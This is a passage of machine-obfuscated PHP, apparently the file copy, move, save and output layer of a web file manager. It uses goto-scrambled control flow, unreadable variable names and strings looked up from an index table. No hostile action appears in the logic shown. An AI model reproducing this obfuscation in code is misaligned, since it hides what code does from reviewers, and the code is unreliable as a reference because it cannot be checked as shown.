self::copyMoveStart($cá¬ôﬂπÛƒ, $aÖ˘‚çâÑç, $cïÎ ÈÆØ≠, $_SERVER[ú∫][518], $fÊüòöÿ°±); } public static function move($EÉÖÑßàôÍ, $b“Ö€ûƒÎÌ, $E§ÁÜÍ∆¢“ = false, $Bå»ôÁµÁÛ = false) { return self::copyMoveStart($EÉÖÑßàôÍ, $b“Ö€ûƒÎÌ, $E§ÁÜÍ∆¢“, $_SERVER[ú∫][520], $Bå»ôÁµÁÛ); } private static function copyMoveStart($f∫¨âêØ§µ, $E•Ç«Îﬂ¢Í, $dæúŸß¡¯∏, $bÉå‰º∏ûÖ, $aˆı—µ»˜‡) { $c∏É¨≈¿Ï« =& $_SERVER[ú∫]; $c≤îíªåÁ‰ = array($f∫¨âêØ§µ, $E•Ç«Îﬂ¢Í, $dæúŸß¡¯∏, $aˆı—µ»˜‡); Hook::trigger($c∏É¨≈¿Ï«[1044] . $bÉå‰º∏ûÖ . $c∏É¨≈¿Ï«[1045], $c≤îíªåÁ‰); $f€ÁñÒ†°ı = self::copyMove($f∫¨âêØ§µ, $E•Ç«Îﬂ¢Í, $dæúŸß¡¯∏, $bÉå‰º∏ûÖ, $aˆı—µ»˜‡); Hook::trigger($c∏É¨≈¿Ï«[1044] . $bÉå‰º∏ûÖ . $c∏É¨≈¿Ï«[1047], $c≤îíªåÁ‰, $f€ÁñÒ†°ı); return $f€ÁñÒ†°ı; } public static function saveFile($e°¡êå„ﬁö, $E˜√‘Úªó´, $eÖñŒ‰çÔË = true) { goto CÉÂç§é†°; a‡æ»£µåØ: $CõëÁ¯…€È = self::copyFile($eÆÛøóîŸÒ, $e°¡êå„ﬁö, $Dœﬂ†‘ÆÛÒ, $A«‚æòÊª™, $eì´ªûóè’[$C´»ª›ı•¿[28]], $a∑ä–õÌî¡); if ($fËÊÕåóÉø) { $CõëÁ¯…€È = $fËÊÕåóÉø->getPathOuter($CõëÁ¯…€È); } return $CõëÁ¯…€È; goto Eá»û¥å”∏; E∑ﬂå˜ôÌî: $Dœﬂ†‘ÆÛÒ = self::driverMake($E˜√‘Úªó´); $fËÊÕåóÉø = !1; if ($Dœﬂ†‘ÆÛÒ->pathParse[$C´»ª›ı•¿[1048]]) { $d”è˜é∂¡Ü = $Dœﬂ†‘ÆÛÒ->pathParse[$C´»ª›ı•¿[1048]]; $fËÊÕåóÉø = $Dœﬂ†‘ÆÛÒ; $Dœﬂ†‘ÆÛÒ = self::driverMake($d”è˜é∂¡Ü); } goto C‡ßﬂˆÏ¥∞; C‡ßﬂˆÏ¥∞: $A«‚æòÊª™ = $Dœﬂ†‘ÆÛÒ->pathFather($E˜√‘Úªó´); $a∑ä–õÌî¡ = !0; if (!$eÖñŒ‰çÔË && self::driverIsSame($eÆÛøóîŸÒ, $Dœﬂ†‘ÆÛÒ)) { $a∑ä–õÌî¡ = !1; } goto a‡æ»£µåØ; CÉÂç§é†°: $C´»ª›ı•¿ =& $_SERVER[ú∫]; $eì´ªûóè’ = self::info($E˜√‘Úªó´); $eÆÛøóîŸÒ = self::driverMake($e°¡êå„ﬁö); goto E∑ﬂå˜ôÌî; Eá»û¥å”∏: } private static function copyMove($fèí∫‰©Âö, $BöÔ¥·ÙçÍ, $Fßóâ£ó¿•, $eœâ≤É…π¬, $BÓâ√ﬂ∑ûú = false) { goto B„ö©©µ©; bõ•Ñ≈à’É: Hook::trigger($cƒ¶©öè¡õ[73], $eÏÙúÈ⁄”î, $fèí∫‰©Âö, $A√±ÂêÒÃë, $BöÔ¥·ÙçÍ); $A©î¶ÿ´ﬂÃ = self::driverIsSame($eÏÙúÈ⁄”î, $A√±ÂêÒÃë); if ($A©î¶ÿ´ﬂÃ) { if ($eœâ≤É…π¬ == $cƒ¶©öè¡õ[520] && !method_exists($A√±ÂêÒÃë, $cƒ¶©öè¡õ[1049]) && trim($BöÔ¥·ÙçÍ, $cƒ¶©öè¡õ[8]) == trim($A√±ÂêÒÃë->pathFather($fèí∫‰©Âö), $cƒ¶©öè¡õ[8])) { if ($eÏÙúÈ⁄”î->pathThis($fèí∫‰©Âö) != $BÓâ√ﬂ∑ûú && !$eÏÙúÈ⁄”î->isTypeObject()) { return $eÏÙúÈ⁄”î->rename($fèí∫‰©Âö, $BÓâ√ﬂ∑ûú); } return $A√±ÂêÒÃë->getPathOuter($fèí∫‰©Âö); } if (method_exists($A√±ÂêÒÃë, $eœâ≤É…π¬)) { return $A√±ÂêÒÃë->{$eœâ≤É…π¬}($fèí∫‰©Âö, $BöÔ¥·ÙçÍ, $Fßóâ£ó¿•); } } goto cﬁèœ¿ä∆µ; cÚÉäŸ≤ó€: if ($eàá˘…◊í…) { $f√ãòŸíæ˜ = $eàá˘…◊í…->getPathOuter($f√ãòŸíæ˜); } return $f√ãòŸíæ˜; goto FåÔµÊº•ë; B„ö©©µ©: $cƒ¶©öè¡õ =& $_SERVER[ú∫]; if (!$fèí∫‰©Âö || $fèí∫‰©Âö == $cƒ¶©öè¡õ[8] || !$BöÔ¥·ÙçÍ) { return !1; } ignore_timeout(); goto D∑˘ëÃ‹§É; cﬁèœ¿ä∆µ: $fì’Æ›Ö≥Ø = $eÏÙúÈ⁄”î->isFile($fèí∫‰©Âö); if (!$fì’Æ›Ö≥Ø && $A√±ÂêÒÃë->getType() == $cƒ¶©öè¡õ[718] && $eÏÙúÈ⁄”î->getType() == $cƒ¶©öè¡õ[106]) { $f√ãòŸíæ˜ = $A√±ÂêÒÃë->copyFolderFromIO($eÏÙúÈ⁄”î, $fèí∫‰©Âö, $BöÔ¥·ÙçÍ, $Fßóâ£ó¿•, $bË†≤†ïßª, $BÓâ√ﬂ∑ûú); } else { $f√ãòŸíæ˜ = self::copyPath($eÏÙúÈ⁄”î, $fèí∫‰©Âö, $A√±ÂêÒÃë, $BöÔ¥·ÙçÍ, $Fßóâ£ó¿•, $bË†≤†ïßª, $fì’Æ›Ö≥Ø, $BÓâ√ﬂ∑ûú); } if ($f√ãòŸíæ˜ && $bË†≤†ïßª) { $eÏÙúÈ⁄”î->remove($fèí∫‰©Âö); } goto cÚÉäŸ≤ó€; D∑˘ëÃ‹§É: $eÏÙúÈ⁄”î = self::driverMake($fèí∫‰©Âö); $A√±ÂêÒÃë = self::driverMake($BöÔ¥·ÙçÍ); $bË†≤†ïßª = $eœâ≤É…π¬ == $cƒ¶©öè¡õ[520]; goto C¥üƒ÷àµƒ; C¥üƒ÷àµƒ: $eàá˘…◊í… = !1; if ($A√±ÂêÒÃë->pathParse[$cƒ¶©öè¡õ[1048]]) { $BöÔ¥·ÙçÍ = $A√±ÂêÒÃë->pathParse[$cƒ¶©öè¡õ[1048]]; $eàá˘…◊í… = $A√±ÂêÒÃë; $A√±ÂêÒÃë = self::driverMake($BöÔ¥·ÙçÍ); } self::check($eÏÙúÈ⁄”î, $fèí∫‰©Âö, $A√±ÂêÒÃë, $BöÔ¥·ÙçÍ); goto bõ•Ñ≈à’É; FåÔµÊº•ë: } private static function check($DöÍ‡°Úæ‰, $f¢ÑΩ˜Õƒ≈, $díïÑ»óÂ‡, &$cºÒ≈·ú˘π) { $aœ¯Û¥á´Ë =& $_SERVER[ú∫]; if (self::driverIsSame($DöÍ‡°Úæ‰, $díïÑ»óÂ‡) && $DöÍ‡°Úæ‰->isFolder($f¢ÑΩ˜Õƒ≈) && $DöÍ‡°Úæ‰->isParentOf($f¢ÑΩ˜Õƒ≈, $cºÒ≈·ú˘π)) { show_json(LNG($aœ¯Û¥á´Ë[1050]), !1); } if (!$DöÍ‡°Úæ‰->exist($f¢ÑΩ˜Õƒ≈)) { show_json(LNG($aœ¯Û¥á´Ë[105]), !1); } } private static function copyPath($Bâ≤å≥œ‹ã, $EïË£êÒÔ≤, $c◊‘¶·ù≠º, $FùºÏŒ“¥ß, $C®¢∑—ãàŸ, $DÖˆÒáÖñå, $BÆœÙÙ‰Ø, $DˆÒÂÉÒº‰ = false) { goto b˘È¢Ûã≠ƒ; b˘È¢Ûã≠ƒ: $D‰®¥≤óÉä =& $_SERVER[ú∫]; $f∏êä¶Ô€◊ = empty($DˆÒÂÉÒº‰) && $DˆÒÂÉÒº‰ !== $D‰®¥≤óÉä[191] ? $Bâ≤å≥œ‹ã->pathThis($EïË£êÒÔ≤) : $DˆÒÂÉÒº‰; if ($C®¢∑—ãàŸ) { $b¥æøáìÆÁ = $c◊‘¶·ù≠º->fileNameExist($FùºÏŒ“¥ß, $f∏êä¶Ô€◊); $f∏êä¶Ô€◊ = $c◊‘¶·ù≠º->fileNameAuto($FùºÏŒ“¥ß, $f∏êä¶Ô€◊, $C®¢∑—ãàŸ, !$BÆœÙÙ‰Ø); $C®¢∑—ãàŸ = $b¥æøáìÆÁ ? $C®¢∑—ãàŸ : !1; } goto eâ˘Òèæñ∞; E◊à‹ Æ·ﬁ: $B‘È⁄Ãê©ú = is_array($B‘È⁄Ãê©ú) ? $B‘È⁄Ãê©ú : array($D‰®¥≤óÉä[74] => array(), $D‰®¥≤óÉä[75] => array()); $EÚºú⁄¶⁄° = array_merge($B‘È⁄Ãê©ú[$D‰®¥≤óÉä[74]], $B‘È⁄Ãê©ú[$D‰®¥≤óÉä[75]]); foreach ($EÚºú⁄¶⁄° as $d†ÒÁ°Ï¥ñ) { $Cöö›ÙÇÇœ = $d†ÒÁ°Ï¥ñ[$D‰®¥≤óÉä[29]] == $D‰®¥≤óÉä[193]; $EïË£êÒÔ≤ = $Bâ≤å≥œ‹ã->getPathInner($d†ÒÁ°Ï¥ñ[$D‰®¥≤óÉä[76]]); $aãÖ´ÃèèÉ = self::copyPath($Bâ≤å≥œ‹ã, $EïË£êÒÔ≤, $c◊‘¶·ù≠º, $FùºÏŒ“¥ß, $C®¢∑—ãàŸ, $DÖˆÒáÖñå, $Cöö›ÙÇÇœ); if (!$aãÖ´ÃèèÉ) { IO::errorTips($D‰®¥≤óÉä[1051] . $EïË£êÒÔ≤ . $D‰®¥≤óÉä[67] . $FùºÏŒ“¥ß); } } goto c‚∞÷éìæá; aßŸü⁄«ê¬: $Dï–Çëîåè = $c◊‘¶·ù≠º->mkdir($c◊‘¶·ù≠º->getPath($Dá»ﬁÜΩÃ¢)); $FùºÏŒ“¥ß = $c◊‘¶·ù≠º->getPathInner($Dï–Çëîåè); $B‘È⁄Ãê©ú = $Bâ≤å≥œ‹ã->listPath($EïË£êÒÔ≤, !0); goto E◊à‹ Æ·ﬁ; c‚∞÷éìæá: self::copyMoveKeepInfo($Bâ≤å≥œ‹ã, $EïË£êÒÔ≤, $Dï–Çëîåè); return $Dï–Çëîåè; goto bıäÑ¥ƒ◊ì; eâ˘Òèæñ∞: if ($BÆœÙÙ‰Ø) { return self::copyFile($Bâ≤å≥œ‹ã, $EïË£êÒÔ≤, $c◊‘¶·ù≠º, $FùºÏŒ“¥ß, $f∏êä¶Ô€◊, $DÖˆÒáÖñå); } if ($C®¢∑—ãàŸ == REPEAT_RENAME_FOLDER) { $C®¢∑—ãàŸ = !1; } $Dá»ﬁÜΩÃ¢ = rtrim($FùºÏŒ“¥ß, $D‰®¥≤óÉä[8]) . $D‰®¥≤óÉä[8] . $f∏êä¶Ô€◊; goto aßŸü⁄«ê¬; bıäÑ¥ƒ◊ì: } private static function copyFile($cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $bÚ√Éö≠íÈ, $A˜ÿΩ≈Ú‚Ç, $FÑ›∑®úƒò, $Cˆ∑ºœÉ·ã) { goto FÎÇ‰ô⁄∏; FÎÇ‰ô⁄∏: $aÖÿÏè’ÑŒ =& $_SERVER[ú∫]; $A˜ÿΩ≈Ú‚Ç = $bÚ√Éö≠íÈ->getPath(rtrim($A˜ÿΩ≈Ú‚Ç, $aÖÿÏè’ÑŒ[8]) . $aÖÿÏè’ÑŒ[8] . $FÑ›∑®úƒò); $d´›é“¬èÏ = $aÖÿÏè’ÑŒ[1052] . time() . rand_string(5); goto B’ëËÍÓÙÌ; FÛÔ·–á˘Ω: self::remove($FÑ¢üÆŸæÙ); Hook::trigger($aÖÿÏè’ÑŒ[1054], $cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $bÚ√Éö≠íÈ, $A˜ÿΩ≈Ú‚Ç, $FÑ›∑®úƒò, $döóêÙÆ˜À); self::copyMoveKeepInfo($cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $döóêÙÆ˜À); goto bß”…ıŸèá; c—€◊ˆÈë‘: $C–“äà“ºÁ = $cùÚßë⁄¶≤->download($EùêËÉ‡≤Ï, $C–“äà“ºÁ); $C–“äà“ºÁ = $cùÚßë⁄¶≤->iconvApp($C–“äà“ºÁ); $döóêÙÆ˜À = $bÚ√Éö≠íÈ->upload($A˜ÿΩ≈Ú‚Ç, $C–“äà“ºÁ, $Cˆ∑ºœÉ·ã); goto FÛÔ·–á˘Ω; B’ëËÍÓÙÌ: Hook::trigger($aÖÿÏè’ÑŒ[1053], $cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $bÚ√Éö≠íÈ, $A˜ÿΩ≈Ú‚Ç, $FÑ›∑®úƒò, $d´›é“¬èÏ); if (self::driverIsSame($cùÚßë⁄¶≤, $bÚ√Éö≠íÈ)) { if ($Cˆ∑ºœÉ·ã) { $döóêÙÆ˜À = $bÚ√Éö≠íÈ->moveFile($EùêËÉ‡≤Ï, $A˜ÿΩ≈Ú‚Ç); } else { $döóêÙÆ˜À = $bÚ√Éö≠íÈ->copyFile($EùêËÉ‡≤Ï, $A˜ÿΩ≈Ú‚Ç); } Hook::trigger($aÖÿÏè’ÑŒ[1054], $cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $bÚ√Éö≠íÈ, $A˜ÿΩ≈Ú‚Ç, $FÑ›∑®úƒò, $döóêÙÆ˜À); self::copyMoveKeepInfo($cùÚßë⁄¶≤, $EùêËÉ‡≤Ï, $döóêÙÆ˜À); return $döóêÙÆ˜À; } $e˜®≤≠‹∞÷ = TEMP_FILES; goto d‰ ˆÔãÇø; d‰ ˆÔãÇø: if ($GLOBALS[$aÖÿÏè’ÑŒ[6]][$aÖÿÏè’ÑŒ[88]][$aÖÿÏè’ÑŒ[760]]) { $e˜®≤≠‹∞÷ = $GLOBALS[$aÖÿÏè’ÑŒ[6]][$aÖÿÏè’ÑŒ[88]][$aÖÿÏè’ÑŒ[760]]; } $Cˆ∑ºœÉ·ã = !0; $Cäﬁä≥æ‰‹ = $e˜®≤≠‹∞÷; goto dΩñ§¬îÙÓ; bß”…ıŸèá: return $döóêÙÆ˜À; goto B…÷À—Êı„; dΩñ§¬îÙÓ: mk_dir($Cäﬁä≥æ‰‹); $C–“äà“ºÁ = $Cäﬁä≥æ‰‹ . $d´›é“¬èÏ; $FÑ¢üÆŸæÙ = $C–“äà“ºÁ; goto c—€◊ˆÈë‘; B…÷À—Êı„: } private static function copyMoveKeepInfo($DËÜÓá°ó∑, $F…∆¬ê©âæ, $B≤∏±çΩæ) { if (!$B≤∏±çΩæ) { return; } $E’˜Ÿ‘´»ª = $DËÜÓá°ó∑->info($F…∆¬ê©âæ); if (!is_array($E’˜Ÿ‘´»ª)) { return; } IO::setModifyTime($B≤∏±çΩæ, $E’˜Ÿ‘´»ª[$_SERVER[ú∫][84]]); } public static function pathFather($cå‚§Ôä’ç) { $Dû£öÆï∂… = IO::init($cå‚§Ôä’ç); $a„à˘öÜ©ª = $Dû£öÆï∂…->pathFather($Dû£öÆï∂…->path); return $Dû£öÆï∂…->getPathOuter($a„à˘öÜ©ª); } public static function fileOut($C√≠≈›ÖÆ°, $A∫≈í£È´î = false, $eòìÜΩÿ…õ = false, $BÀﬂÿŸÉ√‹ = '') { $FËãÍ™ﬂõŒ = self::driverMake($C√≠≈›ÖÆ°); if ($FËãÍ™ﬂõŒ->isFileOutServer()) { return $FËãÍ™ﬂõŒ->fileOutServer($C√≠≈›ÖÆ°, $A∫≈í£È´î, $eòìÜΩÿ…õ, $BÀﬂÿŸÉ√‹); } return $FËãÍ™ﬂõŒ->fileOut($C√≠≈›ÖÆ°, $A∫≈í£È´î, $eòìÜΩÿ…õ, $BÀﬂÿŸÉ√‹); } public static function fileOutImage($eìü÷é•◊Ã, $eøÂŸô»øœ = 250) { $eµ»◊ óÑá = array(250, 600, 1200, 3000, 5000); for ($fµªï¨˘›ê = 0; $fµªï¨˘›ê < count($eµ»◊ óÑá); $fµªï¨˘›ê++) { if ($fµªï¨˘›ê == 0 && $eøÂŸô»øœ <= $eµ»◊ óÑá[$fµªï¨˘›ê]) { $eøÂŸô»øœ = $eµ»◊ óÑá[$fµªï¨˘›ê]; break; } else { if ($eøÂŸô»øœ > $eµ»◊ óÑá[$fµªï¨˘›ê - 1] && $eøÂŸô»øœ <= $eµ»◊ óÑá[$fµªï¨˘›ê]) { $eøÂŸô»øœ = $eµ»◊ óÑá[$fµªï¨˘›ê]; break; } else { if ($fµªï¨˘›ê == count($eµ»◊ óÑá) - 1 && $eøÂŸô»øœ > $eµ»◊ óÑá[$fµªï¨˘›ê]) { $eøÂŸô»øœ = $eµ»◊ óÑá[$fµªï¨˘›ê]; break; } } } } $B‡Àî¶¿®Ì = self::driverMake($eìü÷é•◊Ã); if ($B‡Àî¶¿®Ì->isFileOutServer()) { return $B‡Àî¶¿®Ì->fileOutImageServer($eìü÷é•◊Ã, $eøÂŸô»øœ); } return $B‡Àî¶¿®Ì->fileOutImage($eìü÷é•◊Ã, $eøÂŸô»øœ); } private static function driverIsSame($D£ÈÍ¢üï∫, $eÇú»ÜÜº®) { goto C∫âÔﬁœƒ≤; C∫âÔﬁœƒ≤: $F ÇïØ¥◊∫ =& $_SERVER[ú∫]; $Bª∆Íô∆èü = $D£ÈÍ¢üï∫->getType(); $dâªı∂ãô⁄ = $eÇú»ÜÜº®->getType(); goto a‹∫≠–ÂáÎ; a‹∫≠–ÂáÎ: if ($Bª∆Íô∆èü != $dâªı∂ãô⁄) { return !1; } if ($Bª∆Íô∆èü == $F ÇïØ¥◊∫[718]) { return !0; } if ($Bª∆Íô∆èü == $F ÇïØ¥◊∫[106]) { return !0; } goto e€é≥¿ÛÚç; e€é≥¿ÛÚç: if ($D£ÈÍ¢üï∫->pathDriver == $eÇú»ÜÜº®->pathDriver) { return !0; } return !1; goto DÊÍ‘ÛÜ•; DÊÍ‘ÛÜ•: } public static function copyUpdate($e√ß”’ÂŒ≈, $CúôÖï”∆¢) { goto b°Ø¨à¨ç…; eÂªÉÍŒé¿: $cèëﬁß±ØÙ = array(); foreach ($EÂãƒ‘Ü‘¶ as $DûΩ∆ÿŸüç => $bÆﬂ∞±Ô©ù) { if (isset($dﬂë≈®·π§[$DûΩ∆ÿŸüç])) { if ($bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[77]] == 1) { continue; } if ($dﬂë≈®·π§[$DûΩ∆ÿŸüç][$C§ìª¥πÙﬁ[78]] == $bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[78]]) { continue; } } if ($bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[77]] == 1) { $cèëﬁß±ØÙ[] = $CúôÖï”∆¢ . $C§ìª¥πÙﬁ[8] . $DûΩ∆ÿŸüç; continue; } $CÜÿÇ∫ﬁòπ = strstr(trim($DûΩ∆ÿŸüç, $C§ìª¥πÙﬁ[8]), $C§ìª¥πÙﬁ[8]) ? get_path_father($DûΩ∆ÿŸüç) : $C§ìª¥πÙﬁ[33]; $FÛö∑€äé‹[] = array($C§ìª¥πÙﬁ[1055] => $bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[76]], $C§ìª¥πÙﬁ[1056] => rtrim($CúôÖï”∆¢, $C§ìª¥πÙﬁ[8]) . $C§ìª¥πÙﬁ[8] . $CÜÿÇ∫ﬁòπ, $C§ìª¥πÙﬁ[1057] => $bÆﬂ∞±Ô©ù); } $AÍÔÍ›Íö¢ = array($C§ìª¥πÙﬁ[193] => $FÛö∑€äé‹, $C§ìª¥πÙﬁ[77] => $cèëﬁß±ØÙ); goto dÀ©§ÚŸÜï; dÀ©§ÚŸÜï: Hook::trigger($C§ìª¥πÙﬁ[1058], $e√ß”’ÂŒ≈, $CúôÖï”∆¢, $AÍÔÍ›Íö¢); foreach ($cèëﬁß±ØÙ as $bÆﬂ∞±Ô©ù) { IO::mkdir($bÆﬂ∞±Ô©ù); } foreach ($FÛö∑€äé‹ as $bÆﬂ∞±Ô©ù) { IO::copy($bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[1055]], $bÆﬂ∞±Ô©ù[$C§ìª¥πÙﬁ[1056]], REPEAT_REPLACE); } goto cΩãØ¢‘‚À; b°Ø¨à¨ç…: $C§ìª¥πÙﬁ =& $_SERVER[ú∫]; if (!IO::exist($e√ß”’ÂŒ≈)) { return !1; } if (!IO::exist($CúôÖï”∆¢)) { IO::mkdir($CúôÖï”∆¢); } goto Eò¿°≤ﬂé≈; Eò¿°≤ﬂé≈: $EÂãƒ‘Ü‘¶ = self::_listAll($e√ß”’ÂŒ≈); $dﬂë≈®·π§ = self::_listAll($CúôÖï”∆¢); $FÛö∑€äé‹ = array(); goto eÂªÉÍŒé¿; cΩãØ¢‘‚À: } private static function _listAll($aÉ÷≠ÁõŒ¶) { $FÜì¬Ïöò† =& $_SERVER[ú∫]; $aÉ÷≠ÁõŒ¶ = KodIO::clear($aÉ÷≠ÁõŒ¶); $cñ”∂Ç∫äÑ = IO::listAll($aÉ÷≠ÁõŒ¶); foreach ($cñ”∂Ç∫äÑ as &$D…◊Ô≠É◊) { $aëƒÒÙæÎ‰ = substr($D…◊Ô≠É◊[$FÜì¬Ïöò†[76]], strlen($aÉ÷≠ÁõŒ¶)); $D…◊Ô≠É◊[$FÜì¬Ïöò†[1059]] = trim($aëƒÒÙæÎ‰, $FÜì¬Ïöò†[8]); } unset($D…◊Ô≠É◊); return array_to_keyvalue($cñ”∂Ç∫äÑ, $FÜì¬Ïöò†[1059]); } public static function fileSubstr($c‹¥Î⁄¶√“, $BÛ∑›àé≤É, $AØö”Ö¢çõ = false) { goto Aé∫¥òŒ™á; E¨Ø≈≤Ñé”: if ($AØö”Ö¢çõ === !1) { $AØö”Ö¢çõ = $cÈóê¡ú„ - $BÛ∑›àé≤É; } if ($BÛ∑›àé≤É + $AØö”Ö¢çõ > $cÈóê¡ú„) { $AØö”Ö¢çõ = $cÈóê¡ú„ - $BÛ∑›àé≤É; } if (!$cÈóê¡ú„ && $e…ﬁ∑£Ωëπ->getType() == $b§ÍÖ”Ã≤[106] && !$e…ﬁ∑£Ωëπ->exist($c‹¥Î⁄¶√“)) { throw new Exception($b§ÍÖ”Ã≤[1060] . LNG($b§ÍÖ”Ã≤[1061]) . $b§ÍÖ”Ã≤[924] . get_path_this($c‹¥Î⁄¶√“) . $b§ÍÖ”Ã≤[33]); } goto bÎ«£¶ÕÉË; BªÕÙ‰…äΩ: if (!$eóÆ∫ÉöÏ≥ && $AØö”Ö¢çõ && isset($GLOBALS[$b§ÍÖ”Ã≤[1062]])) { throw new Exception($GLOBALS[$b§ÍÖ”Ã≤[1062]][$b§ÍÖ”Ã≤[1063]]); } return $eóÆ∫ÉöÏ≥; goto fÌû®Òéçé; bÎ«£¶ÕÉË: if ($AØö”Ö¢çõ <= 0) { return $b§ÍÖ”Ã≤[33]; } if ($BÛ∑›àé≤É < 0 || $BÛ∑›àé≤É >= $cÈóê¡ú„ || $AØö”Ö¢çõ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\145\x52\145\141\x64\40\145\162\x72\157\162\41\x20\x73\164\x61\x72\x74\75{$BÛ∑›àé≤É}\73\154\145\x6e\x67\x74\x68\75{$AØö”Ö¢çõ}\73\40\163\x69\x7a\x65\x3d{$cÈóê¡ú„}\x3b"); } $eóÆ∫ÉöÏ≥ = $e…ﬁ∑£Ωëπ->fileSubstr($c‹¥Î⁄¶√“, $BÛ∑›àé≤É, $AØö”Ö¢çõ); goto BªÕÙ‰…äΩ; Aé∫¥òŒ™á: $b§ÍÖ”Ã≤ =& $_SERVER[ú∫]; $e…ﬁ∑£Ωëπ = self::driverMake($c‹¥Î⁄¶√“); $cÈóê¡ú„ = $e…ﬁ∑£Ωëπ->size($c‹¥Î⁄¶√“); goto bóÌÕë„ÇÆ; bóÌÕë„ÇÆ: $A·¢ßÉ‡óÙ = $BÛ∑›àé≤É; $Eá∆ÛΩâÖë = $AØö”Ö¢çõ; if ($BÛ∑›àé≤É < 0) { $BÛ∑›àé≤É = $cÈóê¡ú„ + $BÛ∑›àé≤É; } goto E¨Ø≈≤Ñé”; fÌû®Òéçé: } private static function driverMake(&$F–ñ√‰ø•€) { goto aÉ°ˆìÉ˘; B´ÔìŒºÍ˜: return $B”ÛÓèÖ ‹; goto f©¨ÎæÖ√√; aÉ°ˆìÉ˘: $A´ÛÀæÿÎÒ =& $_SERVER[ú∫]; $BππËûÍŒÖ = KodIO::parse($F–ñ√‰ø•€); if (!self::$driverListSystem) { $f⁄µÑÚÚÚò = Model($A´ÛÀæÿÎÒ[727])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($f⁄µÑÚÚÚò, $A´ÛÀæÿÎÒ[393]); } goto b…æ„á Ù•; b…æ„á Ù•: if ($BππËûÍŒÖ[$A´ÛÀæÿÎÒ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$BππËûÍŒÖ[$A´ÛÀæÿÎÒ[393]]]) { return !1; } $F–ñ√‰ø•€ = $BππËûÍŒÖ[$A´ÛÀæÿÎÒ[1064]]; $B”ÛÓèÖ ‹ = self::driverGet($BππËûÍŒÖ, $F–ñ√‰ø•€); goto B´ÔìŒºÍ˜; f©¨ÎæÖ√√: } private static function driverGet($FµÖæü®óô, &$BûÇ√Ω¯çÆ) { goto b≠ÛãÎü≈≈; b≠ÛãÎü≈≈: $eõâ£÷®æ§ =& $_SERVER[ú∫]; $EúÑû¥‡Í≠ = $FµÖæü®óô[$eõâ£÷®æ§[1065]]; $E≥ÛÍ∫‰à∏ = $FµÖæü®óô[$eõâ£÷®æ§[393]]; goto BŒãàËæ¡Ñ; a˘Íô»≠‰⁄: $CÛ¶‹ÿ¶÷Â->path = $BûÇ√Ω¯çÆ; return $CÛ¶‹ÿ¶÷Â; goto eŒÌäñ˜ãµ; aÍ÷‘ÈÙ¨¡: if (isset($e≠»˜éáè–[$eõâ£÷®æ§[6]][$eõâ£÷®æ§[1076]])) { $CÛ¶‹ÿ¶÷Â->pathBase = rtrim($e≠»˜éáè–[$eõâ£÷®æ§[6]][$eõâ£÷®æ§[1076]], $eõâ£÷®æ§[8]) . $eõâ£÷®æ§[8]; $BûÇ√Ω¯çÆ = $CÛ¶‹ÿ¶÷Â->pathBase . ltrim($BûÇ√Ω¯çÆ, $eõâ£÷®æ§[8]); } $BûÇ√Ω¯çÆ = $CÛ¶‹ÿ¶÷Â->getPath($BûÇ√Ω¯çÆ); if (isset($FµÖæü®óô[$eõâ£÷®æ§[1048]])) { $BûÇ√Ω¯çÆ = $FµÖæü®óô[$eõâ£÷®æ§[1048]]; } goto a˘Íô»≠‰⁄; BŒãàËæ¡Ñ: switch ($FµÖæü®óô[$eõâ£÷®æ§[29]]) { case KodIO::KOD_IO: $e≠»˜éáè– = self::$driverListSystem[$E≥ÛÍ∫‰à∏]; break; case KodIO::KOD_SOURCE: $BûÇ√Ω¯çÆ = $E≥ÛÍ∫‰à∏ . $BûÇ√Ω¯çÆ; $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1067], $eõâ£÷®æ§[6] => $FµÖæü®óô); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a”ˆèú‚ä¶ = $GLOBALS[$eõâ£÷®æ§[1068]]; self::$driverListUser = array_to_keyvalue($a”ˆèú‚ä¶, $eõâ£÷®æ§[393]); } $e≠»˜éáè– = self::$driverListUser[$E≥ÛÍ∫‰à∏]; break; case KodIO::KOD_SHARE_LINK: $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1069], $eõâ£÷®æ§[6] => $FµÖæü®óô); $B˜ÍæÂ€ÆÖ = Action($eõâ£÷®æ§[1070])->sharePathInfo($FµÖæü®óô[$eõâ£÷®æ§[76]]); $BûÇ√Ω¯çÆ = $B˜ÍæÂ€ÆÖ[$eõâ£÷®æ§[395]]; if (!$B˜ÍæÂ€ÆÖ[$eõâ£÷®æ§[395]]) { $BÊ…ë¡ı≥» = Model($eõâ£÷®æ§[563])->getInfo($B˜ÍæÂ€ÆÖ[$eõâ£÷®æ§[468]]); $BûÇ√Ω¯çÆ = KodIO::clear($BÊ…ë¡ı≥»[$eõâ£÷®æ§[1071]] . $FµÖæü®óô[$eõâ£÷®æ§[1064]]); $FµÖæü®óô[$eõâ£÷®æ§[466]] = $BÊ…ë¡ı≥»; $FµÖæü®óô[$eõâ£÷®æ§[1048]] = $BûÇ√Ω¯çÆ; $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1072], $eõâ£÷®æ§[6] => $FµÖæü®óô); } break; case KodIO::KOD_SHARE_ITEM: $e≠»˜éáè– = array($eõâ£÷®æ§[1066] => $eõâ£÷®æ§[1073], $eõâ£÷®æ§[6] => $FµÖæü®óô); $BÊ…ë¡ı≥» = Model($eõâ£÷®æ§[563])->getInfo($FµÖæü®óô[$eõâ£÷®æ§[393]]); if ($BÊ…ë¡ı≥»[$eõâ£÷®æ§[395]] == $eõâ£÷®æ§[191]) { $BûÇ√Ω¯çÆ = KodIO::clear($BÊ…ë¡ı≥»[$eõâ£÷®æ§[1071]] . $FµÖæü®óô[$eõâ£÷®æ§[1064]]); $FµÖæü®óô[$eõâ£÷®æ§[466]] = $BÊ…ë¡ı≥»; $FµÖæü®óô[$eõâ£÷®æ§[1048]] = 